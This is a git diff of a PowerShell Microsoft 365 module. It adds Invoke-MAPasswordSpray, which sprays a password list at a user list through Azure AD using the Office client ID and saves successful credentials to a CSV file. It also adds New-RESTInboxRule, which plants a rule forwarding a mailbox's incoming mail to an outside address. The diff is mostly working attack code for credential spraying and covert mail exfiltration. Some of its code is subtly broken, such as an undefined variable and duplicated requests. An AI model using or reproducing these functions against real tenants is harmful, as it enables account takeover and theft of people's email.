@@ -19,7 +19,8 @@ function Get-AADToken
 	}
 	ElseIf($ClientSecret)
 	{
-		[uri]$authority = "https://login.microsoftonline.com/" + $TenantID
+        #[uri]$authority = "https://login.microsoftonline.com/" + $TenantID
+        [uri]$authority = "https://login.microsoftonline.com/common/oauth2/authorize"
 
 	}
 	else
@@ -64,7 +65,11 @@ function Get-AADToken
 		$authresult = $clientapp.AcquireTokenForClientAsync($appscopes)
 	}
 	else{
-		$authresult = $clientapp.AcquireTokenAsync($appscopes)
+        if($RedirectUri)
+        {
+            $clientapp.RedirectUri = $RedirectUri
+        }
+        $authresult = $clientapp.AcquireTokenAsync($appscopes)
 	}
 	
 	return $authresult
@@ -93,7 +98,8 @@ function Get-RESTMailContacts
     {
     $contacturl = "https://graph.microsoft.com/v1.0/me/contacts"
     }
-    $allcontacts = Invoke-RestMethod -Uri $contacturl -Method GET -Headers @{Authorization = $Authentication.result.CreateAuthorizationHeader()}
+    $allcontacts = Invoke-RestMethod -Uri $contacturl -Method GET -Headers @{Authorization = $Authentication.CreateAuthorizationHeader()}
+    $allcontacts = Invoke-RestMethod -Uri $contacturl -Method GET -Headers @{Authorization = $token}
 
     #Loop through returned contacts and 
     foreach($c in $allcontacts.value)
@@ -114,7 +120,7 @@ function Get-RESTMailContacts
     }
     while($morecontacts -eq $true)
     {
-        $nextcontacts = Invoke-RestMethod -Uri $nextlink -Method GET -Headers @{Authorization = $Authentication.result.CreateAuthorizationHeader()}
+        $nextcontacts = Invoke-RestMethod -Uri $nextlink -Method GET -Headers @{Authorization = $Authentication.CreateAuthorizationHeader()}
 
         #Loop through returned contacts and 
         foreach($c in $nextcontacts.value)
@@ -148,16 +154,126 @@ function Add-RESTGuest
         $SendInviteMessage,
         $GuestDisplayName
     )
-    $inviteurl = $groupurl = "https://graph.microsoft.com/v1.0/invitations"
+    $inviteurl = "https://graph.microsoft.com/v1.0/invitations"
 
-    $inviteurl = $groupurl = "https://graph.microsoft.com/v1.0/invitations"
     $newinvitebody = @{
     "invitedUserEmailAddress" = $GuestEmail;
-    "inviteRedirectUrl"=$GuestEmail;
+    "inviteRedirectUrl"=$RedirectUrl;
     "sendInvitationMessage"=$SendInviteMessage;
     "invitedUserDisplayName"=$GuestDisplayName
     }
 $newinvitebody = $newinvitebody | ConvertTo-Json -Depth 10
 Invoke-RestMethod -Uri $inviteurl -Method POST -Headers @{Authorization = $authentication.result.CreateAuthorizationHeader()} -ContentType application/json -Body $newinvitebody
+
+}
+
+function Invoke-MAPasswordSpray
+{
+    param(
+        [string[]]$Userlist,
+        [string[]]$PasswordList,
+        [int]$CoolDown,
+        [int]$GroupSize
+    )
+    
+    ###Load MSAL DLL
+    $msalpath = "C:\Nuget\Microsoft.Identity.Client.2.7.1\lib\net45\Microsoft.Identity.Client.dll"
+    Add-Type -Path $msalpath
+    #[uri]$authority = "https://login.microsoftonline.com/common/oauth2/authorize"
+    [uri]$authority = "https://login.microsoftonline.com/organizations/oauth2/authorize"
+    #Microsoft Office Client ID gleaned from Outlook access token
+    $clientid = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+    #Build a client app for Microsoft Graph scopes
+    $graphclientapp = [Microsoft.Identity.Client.PublicClientApplication]::new($clientid,$authority)
+    $graphscopes = New-Object System.Collections.ObjectModel.Collection["string"]
+    $graphscopes.Add("Mail.ReadWrite")
+
+    #Build User Arrays
+    $groups = [math]::Round([math]::Ceiling(($userlist.count / $GroupSize)),0)
+    $groupeduserlist = New-Object System.Collections.ArrayList
+    $offset = 0
+    foreach($n in 0..($groups -1)){
+            $groupcol = New-Object System.Collections.ArrayList
+            foreach($g in 0..($GroupSize -1))
+            {
+                [void]$groupcol.Add($userlist[$g + $offset])
+                
+            }
+            [void]$groupeduserlist.Add($groupcol)
+            $offset = $offset + $GroupSize
+    }
+
+    #Create array for collecting results
+    $sprayresults = New-Object System.Collections.ArrayList
+    $groupcount = 1
+    foreach($usergroup in $groupeduserlist)
+    {
+        Write-Host "Processing User Group $($groupcount) of $($groups.count) Total Groups "
+        foreach($user in $usergroup)
+        {    
+        Write-Host "Checking user $($user)" -ForegroundColor Yellow
+        foreach($password in $PasswordList)
+        {
+        $authresult = $graphclientapp.AcquireTokenByUsernamePasswordAsync($graphscopes,$user,(ConvertTo-SecureString $password -AsPlainText -Force))
+        #Wait for ASync task to complete - There is probably a more elegant way to do this
+        while($authresult.IsCompleted -eq $false)
+        {
+            Start-Sleep -Seconds 1
+        }
+        if($authresult.IsFaulted -eq $false)
+        {
+            $credstatus = "Success"
+            Write-Host "Success for $($user)!" -ForegroundColor Green
+        }
+        else{
+            $credstatus = "Failed"
+            Write-Host "Failure for $($user)" -ForegroundColor Red
+        }
+        $userobj = New-Object psobject
+        $userobj | Add-Member -MemberType NoteProperty -Name "User" -Value $u
+        $userobj | Add-Member -MemberType NoteProperty -Name "CredentialStatus" -Value $credstatus
+        $userobj | Add-Member -MemberType NoteProperty -Name "Password" -Value $password
+        [void]$sprayresults.Add($userobj)
+        }
+    }
+    Write-Host "Finished Processing User Group $($groupcount) - Starting $($cooldown) Second Cooldown"
+    Start-Sleep -Seconds $CoolDown
+    $groupcount++
+
+}
+    $sprayresults | Export-Csv SprayResults.csv -NoTypeInformation
+}
+
+function New-RESTInboxRule
+{
+    param(
+        $Authentication,
+        $Mailbox,
+        $RuleDisplayName,
+        $ForwardToSMTP,
+        $ForwardToDisplay
+
+    )
+    
+    $ruleurl = "https://outlook.office.com/api/beta/users/$($Mailbox)/mailFolders/inbox/messageRules"
+    $rulebody = @{
+        "DisplayName" = $RuleDisplayName;
+        "Sequence" = 1;
+        "IsEnabled" = $true;
+        "Actions" = @{
+            "ForwardTo" = @(
+                @{"EmailAddress" = @{
+                "Name" = $ForwardToDisplay;
+                "Address" = $ForwardToSMTP
+            }
+        }
+            );
+        "StopProcessingRules" = $true
+        }
+    
+    }
+    $rulebody = $rulebody | ConvertTo-Json -Depth 10
+    $ruleadd = Invoke-RestMethod -Uri $ruleurl -Method POST -Headers @{Authorization = $Authentication.result.CreateAuthorizationHeader()} -ContentType application/json -Body $rulebody
+    
 
 }
